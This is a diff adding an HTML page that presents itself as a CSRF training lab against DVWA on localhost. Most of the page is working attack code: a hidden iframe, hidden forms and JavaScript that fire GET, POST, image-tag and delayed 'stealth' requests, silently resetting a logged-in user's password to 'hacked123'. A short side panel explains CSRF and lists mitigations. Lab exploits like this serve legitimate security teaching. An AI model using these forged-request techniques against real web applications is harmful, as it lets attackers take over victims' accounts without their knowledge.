@@ -1,0 +1,399 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced CSRF Vulnerability Demonstration</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            background: white;
+            border-radius: 15px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            overflow: hidden;
+        }
+        
+        .header {
+            background: #2c3e50;
+            color: white;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        .header h1 {
+            font-size: 2.5em;
+            margin-bottom: 10px;
+        }
+        
+        .header .subtitle {
+            font-size: 1.2em;
+            opacity: 0.8;
+        }
+        
+        .content {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 0;
+        }
+        
+        .attack-panel, .educational-panel {
+            padding: 30px;
+        }
+        
+        .attack-panel {
+            background: #f8f9fa;
+            border-right: 3px solid #e9ecef;
+        }
+        
+        .educational-panel {
+            background: #ffffff;
+        }
+        
+        .panel-title {
+            color: #2c3e50;
+            margin-bottom: 20px;
+            font-size: 1.5em;
+            border-bottom: 2px solid #3498db;
+            padding-bottom: 10px;
+        }
+        
+        .form-group {
+            margin-bottom: 20px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: #34495e;
+        }
+        
+        input[type="text"], input[type="url"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #ddd;
+            border-radius: 8px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+        
+        input[type="text"]:focus, input[type="url"]:focus {
+            border-color: #3498db;
+            outline: none;
+        }
+        
+        .attack-methods {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .attack-btn {
+            background: #e74c3c;
+            color: white;
+            border: none;
+            padding: 15px;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+            transition: background 0.3s;
+            font-weight: 600;
+        }
+        
+        .attack-btn:hover {
+            background: #c0392b;
+        }
+        
+        .stealth-btn {
+            background: #34495e;
+        }
+        
+        .stealth-btn:hover {
+            background: #2c3e50;
+        }
+        
+        .status-panel {
+            margin-top: 20px;
+            padding: 15px;
+            border-radius: 8px;
+            display: none;
+        }
+        
+        .status-success {
+            background: #d4edda;
+            border: 1px solid #c3e6cb;
+            color: #155724;
+        }
+        
+        .status-info {
+            background: #d1ecf1;
+            border: 1px solid #bee5eb;
+            color: #0c5460;
+        }
+        
+        .info-box {
+            background: #e8f4f8;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        
+        .info-box h3 {
+            color: #2c3e50;
+            margin-bottom: 10px;
+        }
+        
+        .vulnerability-details {
+            background: #fff3cd;
+            padding: 20px;
+            border-radius: 8px;
+            margin: 15px 0;
+        }
+        
+        .code-block {
+            background: #2c3e50;
+            color: #ecf0f1;
+            padding: 15px;
+            border-radius: 8px;
+            font-family: 'Courier New', monospace;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        
+        .hidden-frame {
+            position: absolute;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+        }
+        
+        .attack-log {
+            background: #f8f9fa;
+            border: 1px solid #dee2e6;
+            border-radius: 8px;
+            padding: 15px;
+            margin-top: 20px;
+            max-height: 200px;
+            overflow-y: auto;
+        }
+        
+        .log-entry {
+            padding: 5px 0;
+            border-bottom: 1px solid #eee;
+            font-family: 'Courier New', monospace;
+            font-size: 14px;
+        }
+        
+        .timestamp {
+            color: #7f8c8d;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Advanced CSRF Attack Laboratory</h1>
+            <div class="subtitle">Cross-Site Request Forgery Vulnerability Demonstration</div>
+        </div>
+        
+        <div class="content">
+            <div class="attack-panel">
+                <h2 class="panel-title">Attack Configuration</h2>
+                
+                <div class="form-group">
+                    <label for="targetEndpoint">DVWA CSRF Endpoint:</label>
+                    <input type="url" id="targetEndpoint" value="http://localhost/dvwa/vulnerabilities/csrf/" placeholder="http://localhost/dvwa/vulnerabilities/csrf/">
+                </div>
+                
+                <div class="form-group">
+                    <label for="newPassword">New Password:</label>
+                    <input type="text" id="newPassword" value="hacked123" placeholder="Enter new password">
+                </div>
+                
+                <div class="form-group">
+                    <label for="confirmPassword">Confirm Password:</label>
+                    <input type="text" id="confirmPassword" value="hacked123" placeholder="Confirm new password">
+                </div>
+                
+                <div class="attack-methods">
+                    <button class="attack-btn" onclick="executeGetCSRF()">GET Request Attack</button>
+                    <button class="attack-btn stealth-btn" onclick="executePostCSRF()">POST Request Attack</button>
+                    <button class="attack-btn" onclick="executeImageCSRF()">Image Tag Attack</button>
+                    <button class="attack-btn stealth-btn" onclick="executeAutoCSRF()">Stealth Auto-Attack</button>
+                </div>
+                
+                <div class="status-panel" id="statusPanel">
+                    <div id="statusMessage"></div>
+                </div>
+                
+                <div class="attack-log">
+                    <h4>Attack Log:</h4>
+                    <div id="attackLog"></div>
+                </div>
+            </div>
+            
+            <div class="educational-panel">
+                <h2 class="panel-title">CSRF Educational Guide</h2>
+                
+                <div class="info-box">
+                    <h3>What is CSRF?</h3>
+                    <p>Cross-Site Request Forgery (CSRF) is an attack that forces an end user to execute unwanted actions on a web application in which they're currently authenticated.</p>
+                </div>
+                
+                <div class="vulnerability-details">
+                    <h3>Attack Vectors Demonstrated:</h3>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li><strong>GET Request:</strong> Hidden form submission via GET</li>
+                        <li><strong>POST Request:</strong> Form submission via POST method</li>
+                        <li><strong>Image Tag:</strong> CSRF via &lt;img&gt; tag src attribute</li>
+                        <li><strong>Auto-Submit:</strong> Silent attack on page load</li>
+                    </ul>
+                </div>
+                
+                <div class="code-block">
+                    // Vulnerable DVWA CSRF Code<br>
+                    if( isset( $_GET[ 'Change' ] ) ) {<br>
+                    &nbsp;&nbsp;$pass_new  = $_GET[ 'password_new' ];<br>
+                    &nbsp;&nbsp;$pass_conf = $_GET[ 'password_conf' ];<br>
+                    &nbsp;&nbsp;// No CSRF token validation!<br>
+                    &nbsp;&nbsp;change_password($pass_new);<br>
+                    }
+                </div>
+                
+                <div class="info-box">
+                    <h3>Mitigation Strategies:</h3>
+                    <ul style="margin-left: 20px; margin-top: 10px;">
+                        <li>Implement CSRF tokens</li>
+                        <li>Use SameSite cookies</li>
+                        <li>Require re-authentication for sensitive actions</li>
+                        <li>Check Referer headers</li>
+                        <li>Use custom request headers</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Hidden elements for CSRF attacks -->
+    <iframe name="hiddenFrame" class="hidden-frame"></iframe>
+    
+    <form id="getCsrfForm" method="GET" target="hiddenFrame" style="display: none;">
+        <input type="text" name="password_new" id="getPasswordNew">
+        <input type="text" name="password_conf" id="getPasswordConf">
+        <input type="submit" name="Change" value="Change">
+    </form>
+    
+    <form id="postCsrfForm" method="POST" target="hiddenFrame" style="display: none;">
+        <input type="text" name="password_new" id="postPasswordNew">
+        <input type="text" name="password_conf" id="postPasswordConf">
+        <input type="submit" name="Change" value="Change">
+    </form>
+
+    <script>
+        let attackCounter = 0;
+        
+        function logAttack(method, details) {
+            attackCounter++;
+            const log = document.getElementById('attackLog');
+            const timestamp = new Date().toLocaleTimeString();
+            const logEntry = document.createElement('div');
+            logEntry.className = 'log-entry';
+            logEntry.innerHTML = `<span class="timestamp">[${timestamp}]</span> #${attackCounter} ${method}: ${details}`;
+            log.appendChild(logEntry);
+            log.scrollTop = log.scrollHeight;
+        }
+        
+        function showStatus(message, type = 'success') {
+            const panel = document.getElementById('statusPanel');
+            const messageDiv = document.getElementById('statusMessage');
+            messageDiv.textContent = message;
+            panel.className = `status-panel status-${type}`;
+            panel.style.display = 'block';
+            
+            setTimeout(() => {
+                panel.style.display = 'none';
+            }, 5000);
+        }
+        
+        function executeGetCSRF() {
+            const targetUrl = document.getElementById('targetEndpoint').value;
+            const newPassword = document.getElementById('newPassword').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            
+            document.getElementById('getPasswordNew').value = newPassword;
+            document.getElementById('getPasswordConf').value = confirmPassword;
+            
+            const form = document.getElementById('getCsrfForm');
+            form.action = targetUrl;
+            form.submit();
+            
+            logAttack('GET CSRF', `Password change to "${newPassword}"`);
+            showStatus('GET-based CSRF attack executed! Check DVWA password change page.');
+        }
+        
+        function executePostCSRF() {
+            const targetUrl = document.getElementById('targetEndpoint').value;
+            const newPassword = document.getElementById('newPassword').value;
+            const confirmPassword = document.getElementById('confirmPassword').value;
+            
+            document.getElementById('postPasswordNew').value = newPassword;
+            document.getElementById('postPasswordConf').value = confirmPassword;
+            
+            const form = document.getElementById('postCsrfForm');
+            form.action = targetUrl;
+            form.submit();
+            
+            logAttack('POST CSRF', `Password change to "${newPassword}"`);
+            showStatus('POST-based CSRF attack executed! More stealthy than GET.');
+        }
+        
+        function executeImageCSRF() {
+            const targetUrl = document.getElementById('targetEndpoint').value;
+            const newPassword = document.getElementById('newPassword').value;
+            
+            // Create a hidden image tag that triggers the CSRF
+            const img = document.createElement('img');
+            img.src = `${targetUrl}?password_new=${encodeURIComponent(newPassword)}&password_conf=${encodeURIComponent(newPassword)}&Change=Change`;
+            img.style.display = 'none';
+            document.body.appendChild(img);
+            
+            logAttack('IMG Tag CSRF', `Via image src attribute`);
+            showStatus('Image tag CSRF executed! This works even if JavaScript is disabled.');
+        }
+        
+        function executeAutoCSRF() {
+            // Simulate a malicious page that attacks automatically
+            setTimeout(() => {
+                executeGetCSRF();
+                logAttack('Auto CSRF', 'Automatic attack on page load simulation');
+            }, 2000);
+            
+            showStatus('Stealth attack initiated... will execute in 2 seconds', 'info');
+        }
+        
+        // Initialize attack log
+        logAttack('System', 'CSRF Laboratory Ready');
+        
+        // Demo: Show how the attack would work automatically in a real scenario
+        setTimeout(() => {
+            logAttack('Demo', 'In a real attack, this would run automatically when user visits the page');
+        }, 1000);
+    </script>
+</body>
+</html>
